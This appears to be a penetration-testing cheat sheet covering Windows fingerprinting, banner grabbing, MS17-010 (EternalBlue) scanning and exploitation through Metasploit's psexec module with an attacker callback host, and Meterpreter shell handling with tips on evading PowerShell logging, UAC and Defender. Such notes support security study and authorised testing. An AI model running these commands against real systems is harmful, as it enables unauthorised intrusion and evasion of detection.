## Windows OS Fingerprinting

Target is up and responding to ICMP with a **TTL** of or near 128.

Identify OS via ICMP TTL

```
ping <TARGET_IP>
```

Standard OS identification using TCP/IP stack metrics

```
sudo nmap -v -O <TARGET_IP>
```

Aggressive identification when standard scans return limited results

```
sudo nmap -v -A -Pn <TARGET_IP>
```

- Ping
    
    - `ping <TARGET_IP>`
    - Prefer for quick, low-noise identification of the 128 TTL signature.
- Nmap
    
    - `nmap -O <TARGET_IP>`
    - Prefer for version-level granularity (e.g., Windows 10 1709-1909).
- **Firewalls or security features** can obscure host details or provide misleading stack responses.
    

---

## Service Banner Grabbing

Open ports identified but service versions or specific software (e.g., VMware) remain unconfirmed.

Standard banner retrieval for all open ports

```
sudo nmap -v <TARGET_IP> --script banner.nse
```

- **Lack of response** from `banner.nse` does not confirm service inactivity; many ports require specific probes to release a banner.

---

## SMB Vulnerability Scanning (MS17-010)

Windows Server 2008 through 2016 identified with port 445 open.

Verify EternalBlue vulnerability status without exploitation

```
msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS <TARGET_IP>; run"
```

- **SMB Message Signing Disabled**: Default state in many environments allows for easier exploitation and spoofing.
    
- **Network latency** can cause false negatives; ensure `THREADS` is set appropriately for the environment.
    

---

## SMB Remote Code Execution (MS17-010)

Target confirmed **vulnerable** to MS17-010 via scanner and requires **SYSTEM** level access.

Execute EternalBlue via psexec variant for better reliability

```
use exploit/windows/smb/ms17_010_psexec
set RHOSTS <TARGET_IP>
set LHOST <ATTACK_IP>
set LPORT <PORT>
exploit
```

- **Service start timeout**: Exploit might report a timeout but still succeed if the payload is a non-service executable.

---

## Post-Exploitation Shell Handling

Active Meterpreter session established and native OS interaction is required.

Drop from Meterpreter to native CMD shell

```
shell
```

- CMD
    
    - `shell` (then check for `C:\>`)
    - Prefer for **stealth** as it lacks command history and ignores **Execution Policy** and **UAC**.
- PowerShell
    
    - `shell` (then check for `PS C:\>`)
    - Prefer for .NET object manipulation and advanced administration.
- **PowerShell Command History**: Commands are recorded on disk, increasing the forensic footprint compared to CMD.
    
- **Execution Policy / UAC**: Can prevent PowerShell script execution; CMD is unaffected.
    
- **Legacy Hosts**: Windows XP and older do not have PowerShell; CMD is the only option.
    
- **WSL/PowerShell Core**: Network traffic from these instances may bypass **Windows Firewall** and **Windows Defender**.
    

> ⚠️ Gap: Transitioning from Meterpreter to a stable PowerShell session often requires `load powershell` or calling `powershell.exe` specifically; the `shell` command defaults to the system's primary command processor (usually CMD).